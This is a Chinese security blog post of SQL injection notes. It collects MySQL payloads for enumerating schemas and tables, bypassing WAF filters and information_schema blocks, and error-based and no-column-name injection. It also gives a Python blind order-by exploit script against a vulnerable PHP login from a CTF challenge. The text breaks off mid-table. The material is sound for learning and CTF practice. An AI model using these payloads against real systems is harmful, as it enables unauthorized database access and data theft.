@@ -1,0 +1,635 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Squirt1e"><meta name="renderer" content="webkit"><meta name="copyright" content="Squirt1e"><meta name="keywords" content="Squirt1e's blog"><meta name="description" content="一名网络安全从业人员的博客"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>SQL注入究极之总结 · Squirt1e's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="https://nese.team/" target="_black">NESE</a></span><span><a href="https://blog.z3ratu1.top/" target="_black">Z3ratu1</a></span><span><a href="https://harmless.blue/" target="_black">CrumbledWall</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">SQL注入究极之总结</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-05-15</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="SQL注入"> SQL注入</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">4.2k</span> | Reading time: <span class="post-count">17</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="SQL注入-amp-amp-工具笔记"><a href="#SQL注入-amp-amp-工具笔记" class="headerlink" title="SQL注入&amp;&amp;工具笔记"></a>SQL注入&amp;&amp;工具笔记</h1><blockquote>
+<p>很久之前上铁三培训课记的笔记。当时主要想补一补sql注入，但没想到讲的太浅了，甚至连原理都讲不明白，于是这篇比较全面的笔记就诞生了。很多类型的注入在本文都不会提及，很大篇幅是对一些trick的探索及分析。</p>
+</blockquote>
+<h2 id="铁三笔记"><a href="#铁三笔记" class="headerlink" title="铁三笔记"></a>铁三笔记</h2><blockquote>
+<p>这部分只能说在听课之前我是想认真整理笔记的-.-</p>
+</blockquote>
+<h4 id="mysql中一些常用函数"><a href="#mysql中一些常用函数" class="headerlink" title="mysql中一些常用函数"></a>mysql中一些常用函数</h4><ul>
+<li>database() 数据库名</li>
+<li>version()  MYSQL数据库版本</li>
+<li>load_file() MYSQL读取本地文件</li>
+<li>@@datadir 读取数据库路径</li>
+<li>@@basedir MYSQL安装路径</li>
+<li>@@plugin_dir plugin目录路径</li>
+<li>@@secure_file_priv 对于文件读&#x2F;写功能的描述。目录名表示仅允许对特定目录的文件进行读&#x2F;写，无表示任意读写，NULL表示禁止读写。</li>
+</ul>
+<h4 id="MYSQL链接字符串函数"><a href="#MYSQL链接字符串函数" class="headerlink" title="MYSQL链接字符串函数"></a>MYSQL链接字符串函数</h4><ul>
+<li>concat(str1,str2)    concat(username,0x23,password,0x23)</li>
+<li>concat_ws(separator,str1,str2…)   concat_ws(0x23,username,password)</li>
+<li>group_concat(str1,str2……) 每一行的数据都显示出来</li>
+</ul>
+<h4 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h4><ul>
+<li>ExtractValue</li>
+<li>updataXML</li>
+</ul>
+<p>&#x3D;&#x3D;ExtractValue(XML_document,XPath_string):&#x3D;&#x3D;</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string(Xpath格式的字符串)</p>
+<p>作用：从目标XML中返回包含所查询值的字符串</p>
+<p>例如：</p>
+<p>or extractvalue(1,payload) &#x3D;&#x3D;&gt; or extractvalue(1,concat(0x7e,(select @@version),0x7e))</p>
+<p>&#x3D;&#x3D;UpdateXML(XML_document,XPath_string,new_value):&#x3D;&#x3D;</p>
+<p>前两个参数和ExtractValue的参数相同</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>作用：改变文档中符合条件的节点的值</p>
+<p>例如：</p>
+<p>or updatexml(1,payload,1) &#x3D;&#x3D;&gt; or updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
+<h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h4 id="information-schema被禁用"><a href="#information-schema被禁用" class="headerlink" title="information_schema被禁用"></a>information_schema被禁用</h4><blockquote>
+<p>information_schema是mysql的默认库，库里有tables,columns这些关键表，里面记载着表名、列名、字段等关键信息。因此常用于sql注入，但很多waf都过滤了information、schema这些字段。</p>
+</blockquote>
+<p>读者可以查看自己的information_schema去了解该默认库。下图是我查看information_schema库中的columns表，可以看到里面记载着table_chema,table_name,column_name等信息(连接数据库工具为Navicat)：</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707225633.png" style="zoom: 50%;" />
+
+<p>默认注入点所在的表有三个字段，第二个字段有回显。因此最常见的payload为：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">--查数据库
+squirt1e' union select 1,group_concat(schema_name),3 from information_schema.schemata#
+--查表
+squirt1e' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='xxx'#
+--查字段
+squirt1e' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='xxxx'#
+--查数据
+squirt1e' union select 1,group_concat(列名1,列名2...),3 from 表名#
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们关注的无法就是查库名、表名、列名。如果information_schema被过滤，最简单的思路就是去找别的默认库。下面将介绍&#x3D;&#x3D;InnoDb&#x3D;&#x3D;存储引擎以及&#x3D;&#x3D;sys数据库&#x3D;&#x3D;。</p>
+<h5 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h5><p>从MYSQL5.5.5开始，InnoDB成为其默认存储引擎。存储引擎处于文件系统之上，在数据保存到数据文件之前会传输到存储引擎（<strong>也就是存储了数据</strong>），之后按照各个存储引擎的存储格式进行存储。</p>
+<p>而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
+<p>比如：</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707231744.png" style="zoom:50%;" />
+
+<p>可以看到innodb_table_states的两个重要字段为database_name以及table_name。那么我们的payload（默认有回显，三个字段）就可以换成：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#原有的payload
+
+0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()#改进的payload
+
+0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_index_stats/**/where/**/database_name=database()#innodb_index_stats也是一样的
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h5><p>mysql在5.7版本中新增了sys库，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据，该库存在很多视图。</p>
+<p>&#x3D;&#x3D;实验前提：我在一个新的mysql环境中只创建了test一个库，其中表名为flag，字段只有一个flag，并未设置自增。&#x3D;&#x3D;</p>
+<p>sys这个库有很多视图，其中schema_auto_increment_columns视图值得注意，该视图的作用简单来说就是用来对表自增ID的监控。</p>
+<p>此时输入：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM sys.schema_auto_increment_columns
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>结果是为空的，这是因为我的非系统表只有一个flag表，并且还没有设置自增id。但是该视图有table_shema,table_name这两个字段，因此在设置了自增id的情况下，我们的payload就可以改成：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_shcema=database()#改进的payload
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>尽管在真实场景中很多表是有自增id的，但我们还是想找到一个通解。</strong></p>
+<p>简单的翻了一下sys，找到了六个视图。这六个视图均能查询到不存在自增id的表名。</p>
+<ul>
+<li>innodb_buffer_stats_by_table                    字段：object_schema          object_name</li>
+<li>schema_table_statistics                               字段：table_schema            table_name</li>
+<li>schema_table_statistics_with_buffer         字段：table_schema            table_name</li>
+<li>x$innodb_buffer_stats_by_table                字段：object_schema          object_name</li>
+<li>x$schema_table_statistics                           字段：table_schema            table_name</li>
+<li>x$schema_table_statistics_with_buffer     字段：table_schema            table_name</li>
+</ul>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20003513.png" style="zoom:50%;" />
+
+<p>条条payload通罗马：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.innodb_buffer_stats_by_table/**/where/**/object_shcema=database()#改进的payload
+
+0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics/**/where/**/table_shcema=database()#改进的payload
+
+0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_shcema=database()#改进的payload
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过sys和InnoDb我们可以绕过information_schema实现爆库名及表名，接下来就要想办法爆列名。</p>
+<h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><p>举例说明：</p>
+<p>可以看到from后面跟了select * from flag as a join flag as b，我通过join把a表和b表连接起来了，此时他们产生了相同的列名，如果通过(select * from flag as a join flag as b)c起了别名c，这样就与<strong>使用别名时，表中不能出现同的字段名</strong>的特性相冲突，因此会导致报错，报错内容为相同的列名(即第一个字段)。</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20005623.png" style="zoom:50%;" />
+
+<p>接着，我在flag表创建了第二个字段。如果想获得下一个字段时需要使用using，using等价于join操作中的on,例如a和b根据flag字段关联：</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20010648.png" style="zoom:50%;" />
+
+<p>这样我们就注出了第二列，因此无列名注入payload为：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">0' union all select* from (select * from flag as a join flag b)c#
+0' union all select* from (select * from flag as a join flag b using(flag))c#
+0' union all select* from (select * from flag as a join flag b using(flag,squirt1e))c#
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="各种关键字、函数过滤绕过"><a href="#各种关键字、函数过滤绕过" class="headerlink" title="各种关键字、函数过滤绕过"></a>各种关键字、函数过滤绕过</h4><h5 id="and-or"><a href="#and-or" class="headerlink" title="and or"></a>and or</h5><ol>
+<li>逻辑运算符：and&#x3D;&gt;&amp;&amp;、or&#x3D;&gt;||</li>
+<li>异或运算^</li>
+</ol>
+<h5 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h5><ol>
+<li>括号代替空格</li>
+<li>内联注释&#x2F;**&#x2F;</li>
+<li>%09, %0a, %0b, %0c, %0d, %a0</li>
+<li>TAB换行符</li>
+</ol>
+<h5 id="单-x2F-双引号"><a href="#单-x2F-双引号" class="headerlink" title="单&#x2F;双引号"></a>单&#x2F;双引号</h5><ol>
+<li>16进制、8进制、2进制绕过</li>
+</ol>
+<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><ol>
+<li>字符串截断函数：left()、mid()、substr()、substring()</li>
+<li>转换为acsii码函数：ord()、ascii()</li>
+<li>睡眠函数：sleep(),benchmark()</li>
+<li>链接函数：group_concat(),concat(),concat_ws()</li>
+</ol>
+<h5 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h5><p>盲注经常会用到函数，但如果括号被过滤函数也就用不了。因此可以考虑order by盲注，后面会讲。</p>
+<h5 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h5><ol>
+<li>盲注经常会用到substr(),mid()，因此也会用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决：</li>
+</ol>
+<pre class="line-numbers language-mysql"><code class="language-mysql">select substr(database(),1,1)<==>select substr(database() from 1 for 1)
+
+select mid(database(),1,1)<==>select mid(database() from 1 for 1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ol start="2">
+<li>limit也经常会用到，可以使用offset。</li>
+</ol>
+<pre class="line-numbers language-mysql"><code class="language-mysql">select * from flag limit 0,1<==>select * from flag limit 1 offset 0
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><pre class="line-numbers language-mysql"><code class="language-mysql">select if((1=1),1,0)<==>select case when (1=1) then 1 else 0 end
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="比较符号（大于-gt-、小于-lt-）"><a href="#比较符号（大于-gt-、小于-lt-）" class="headerlink" title="比较符号（大于&gt;、小于&lt;）"></a>比较符号（大于&gt;、小于&lt;）</h5><p>greatest(a,b,c)函数返回输入参数(a,b,c)的最大值。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">0'or ascii(susbstr(user(),1,1))>32          <==========>
+0'or greatest(ascii(susbstr(user(),1,1)),32)=32
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><p>如果#,–之类的注释不让用，那么就用or的性质。</p>
+<p>比如语句为select * from articles where id&#x3D;’$id’ and xxx</p>
+<p>令:id&#x3D;1’union select 1,payload,3 or ‘1</p>
+<p>语句就变成：</p>
+<p>select * from articles where id&#x3D;’1’ union select 1,payload,3 or ‘1’ and xxx</p>
+<h5 id="等于号"><a href="#等于号" class="headerlink" title="等于号"></a>等于号</h5><ol>
+<li>like</li>
+<li>in</li>
+<li>regexp</li>
+<li>rlike</li>
+<li>between and           (select mid(database(),1,1) between ‘a’ <strong>and</strong> ‘a’ ;)</li>
+</ol>
+<h5 id="union，select，where"><a href="#union，select，where" class="headerlink" title="union，select，where"></a>union，select，where</h5><ol>
+<li><p>大小写</p>
+</li>
+<li><p>双写</p>
+</li>
+<li><p>内联注释，如果在开头的的&#x2F;*后头加了感叹号，那么此注释里的语句将被执行。例如：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">/*!SELECT*/ flag from flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>通过SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;赋值一个变量，这里支持16进制，然后预编译执行:prepare execsql from @a;execute execsql;这样不用括号。</p>
+<p>用concat配合char也可以：SET @sql&#x3D;concat(char(115,101,108,101,99,116),’* from <code>flag</code>‘);PREPARE jwt from @sql;EXECUTE jwt;</p>
+</li>
+<li><p>使用句柄直接读表也可以，但存储flag的表必须存储在当前数据库下，不然没用：HANDLER Flag OPEN; HANDLER Flag READ FIRST; HANDLER Flag CLOSE;#</p>
+</li>
+<li><p>mysql8.0的特性，后面会讲。</p>
+</li>
+</ol>
+<h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/dempa0fit/topics/1173166">dempa0fit</a>师傅的博客</p>
+</blockquote>
+<pre class="line-numbers language-mysql"><code class="language-mysql">/index.php/
+<?php
+  $dbhost = "localhost";
+  $dbuser = "root";
+  $dbpass = "********";/这里是你的数据库密码/
+  $db = "sqli";
+  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,"utf8");
+ 
+  / sql
+     create  table 
+admin
+ (
+        
+id
+ int(10) not null primary key auto_increment,
+        
+username
+ varchar(20) not null ,
+        
+password
+ varchar(32) not null
+     );
+  */
+function   filter($str){
+      $filterlist = "/(|)|username|password|where|
+      case|when|like|regexp|into|limit|=|for|;/";
+      if(preg_match($filterlist,strtolower($str))){
+        die("illegal input!");
+      }
+      return $str;
+  }
+$username = isset($_POST['username'])?
+filter($_POST['username']):die("please input username!");
+$password = isset($_POST['password'])?
+filter($_POST['password']):die("please input password!");
+$sql = "select * from admin where  username =
+ '$username' and password = '$password' ";
+ 
+$res = $conn -> query($sql);
+if($res->num_rows>0){
+  $row = $res -> fetch_assoc();
+  if($row['id']){
+     echo $row['username'];
+  }
+}else{
+   echo "The content in the password column is the flag!";
+}
+ 
+?>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>安恒杯的一道题目，可以看到(、)、username、password、where、 case、when、like、regexp、into、limit、&#x3D;、for、;被过滤，并且password被过滤，因此盲注行不通，这里考虑用order by盲注。</p>
+<p>比如我输入username&#x3D;admin’ union select 1,2,{} order by 3#&amp;password&#x3D;123。</p>
+<p>那么语句变为：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">select * from admin where  username ='admin' union select 1,2,a order by 3#' and password = '123'
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>password在第三列，因此order by 3。假设password的值为flag，那么显然a是要小于flag的。显然$row[‘id’]取得是第一行，因此username是1；如果输入1,2,f，此时也是1；如果输入1,2,g，那么就回显admin。此时我们就可以猜到了password第一位是f了。</p>
+<p>又由于ordery by 不区分大小写，因此需要用到binary。</p>
+<p>因此exp：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+<span class="token keyword">def</span> <span class="token function">sqli</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">"http://vps_ip/orderbysqli_test/index.php"</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span>text
+
+username <span class="token operator">=</span> <span class="token string">"admin'union select 1,2,0x{} order by 3 desc#"</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+     n <span class="token operator">=</span> <span class="token number">0</span> 
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+     <span class="token comment" spellcheck="true">#print chr(j)</span>
+        n <span class="token operator">+=</span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> username<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+       <span class="token comment" spellcheck="true">#print payload</span>
+        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token operator">not</span> <span class="token keyword">in</span> sqli<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>j<span class="token number">-1</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">94</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'find is over'</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>基于dempa0fit师傅给出的exp小改了一下，总感觉原版写的有点问题。当然我是用记事本写的，因此也不一定对。。</p>
+<p>后续还可以结合order by进行盲注或者报错注入，但我感觉用处不大，因为既然能用盲注，那为什么不直接用盲注呢？希望看到的师傅能给我解答。</p>
+<h4 id="局限的报错注入"><a href="#局限的报错注入" class="headerlink" title="局限的报错注入"></a>局限的报错注入</h4><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://blog.sari3l.com/posts/9622f295/#/%E6%8A%A5%E9%94%99%E5%9E%8B">sari3l</a>师傅的博客，速查表也是出自sari3l师傅。对一些函数进行了解析。</p>
+</blockquote>
+<h5 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h5><p>版本：mysql8.0</p>
+<p>MySQL 8.0 推出了函数 UUID_TO_BIN，因为UUID生成的字符串太大，UUID_TO_BIN就是把UUID字符串转换成16进制，用来精简存储空间。</p>
+<p>正常格式是为：SELECT UUID_TO_BIN(UUID());</p>
+<p>如果不是UUID()生成的字符串，函数会报错。</p>
+<p>payload：SELECT UUID_TO_BIN(database());</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>版本：mysql 5.5</p>
+<p>exp()为会返回e的x次方结果，如果返回结果超过double类型的范围，将会报错。</p>
+<p>payload为：select exp(~(select * from(select database())a))</p>
+<h5 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h5><p>版本：mysql 5.5</p>
+<p>和exp原理一样，运算结果超过范围时，将会报错。</p>
+<p>~0为取反从而得到范围内的最大值，因此select ~0+1就会越界导致报错。因此构造出1就可以了，这里用到非运算!，!后面跟上字符串返回1。</p>
+<p>因此payload为：select ~0+!(select * from (select user())x);</p>
+<p>​							  select !(select * from(select user())x)-~0</p>
+<h5 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h5><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+<th>版本需求</th>
+<th>5.5.x</th>
+<th>5.6.x</th>
+<th>5.7.x</th>
+<th>8.x</th>
+<th>函数显错长度</th>
+<th>Mysql报错内容长度</th>
+<th>额外限制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键重复</td>
+<td>floor round</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td>64</td>
+<td></td>
+<td>data_type ≠ varchar</td>
+</tr>
+<tr>
+<td>列名重复</td>
+<td>name_const</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only version()</td>
+</tr>
+<tr>
+<td>列名重复</td>
+<td>join</td>
+<td>[5.5.49, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only columns</td>
+</tr>
+<tr>
+<td>数据溢出 - Double</td>
+<td>1e308 cot exp pow</td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>数据溢出 - BIGINT</td>
+<td>Bigint</td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>几何对象</td>
+<td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
+<td>[?, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>244</td>
+<td></td>
+</tr>
+<tr>
+<td>空间函数 Geohash</td>
+<td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
+<td>[5.7, ?)</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>GTID</td>
+<td>gtid_subset gtid_subtract</td>
+<td>[5.6.5, ?)</td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>JSON</td>
+<td>json_*</td>
